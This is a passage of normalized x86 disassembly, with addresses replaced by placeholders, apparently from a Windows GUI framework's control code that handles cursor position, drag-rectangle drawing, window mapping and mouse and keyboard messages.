call sub_444968
push eax
call ReleaseDC
retn
sub_43e7f4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax edi
call sub_43f368
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_43dc90
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406a10
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43f334
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43c49c
sub_43e8b8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_43e8f0
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
call sub_43c6d4
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov [ rw-data ] 0xffffffff
sub_43e8fc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_43e938
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_43e984
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_43e9b0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_43e0f0
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_43e0dc
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402a68
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402a68
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_444968
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43ea94
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_43eae0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_40348c
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_40348c
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_43eba4
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_43ebf0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_43ec3c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43ed57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41cf48
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ed5e
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_43ed90
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_43dc90
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_40348c
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_40348c
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_40348c
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_40348c
jmp r-xdata
sub_43ee80
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412618
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_43f368
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_43e0dc
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43e0f0
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_412668
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43f060
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43dc64
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_40348c
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_444968
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43b860
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43f04b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_444968
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_444968
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_40348c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403290
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43daec
test esi esi
je r-xdata
sub_43f060
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_40348c
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43fee4
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40348c
mov eax esi
call sub_43db94
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43db50
mov ecx eax
xor edx edx
xor eax eax
call sub_412640
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_40348c
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43f104
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_43f134
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_43f1a0
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43f260
sub_43f1d0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_43f200
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43dc90
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43f22c
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_43f260
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_43f334
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43f368
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_43f400
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_4553f0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov eax esi
call sub_4553f0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x250 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43dcec
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0xf0 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
sub eax 0x200
je r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45eb9c
jmp r-xdata
dec eax
je r-xdata
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
dec eax
je r-xdata
sub eax 0x3
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_40348c
jmp r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
call sub_455334
mov [ ebp - 0xc ] al
mov ax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_40348c
jmp r-xdata
sub_43f594
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_408754
mov edi eax
mov eax [ esi + 0x64 ]
call sub_408780
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43dcec
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_4085ac
call sub_408548
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_408548
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_43f63c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov al [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_43f66c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push sub_43f630
push ebp
call sub_43f63c
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43f6bc
push ebx
mov ebx eax
cmp [ ebx + 0x122 ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
cmp [ ebx + 0x122 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x120 ]
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
mov edx ebx
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x124 ]
call [ ebx + 0x120 ]
pop ebx
retn
sub_43f748
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x8
mov cl [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_43f780
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi + 0x51 ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
cmp [ edi + 0x48 ] 0x8000
jg r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43f200
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov ax [ esi + 0x4 ]
call sub_4552a4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40348c
jmp r-xdata
cmp [ edi + 0x4c ] 0x8000
jle r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
mov ax [ esi + 0x4 ]
call sub_4552a4
mov ecx eax
or cl [ ebp + 0x8 ]
mov edx ebx
mov eax edi
mov si 0xffd5
call sub_40348c
sub_43f804
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43dcbc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x50 ] 0x2
je r-xdata
test [ ebx + 0x50 ] 0x8
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43e384
mov al [ r-xdata ]
push eax
mov edx esi
xor ecx ecx
mov eax ebx
call sub_43f780
pop esi
pop ebx
retn
or [ ebx + 0x54 ] 0x2
sub_43f850
push ebx
push esi
mov esi edx
mov ebx eax
mov edx ebx
mov eax ebx
call sub_43dcbc
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_43f86c
push ebx
push esi
push edi
mov edi edx
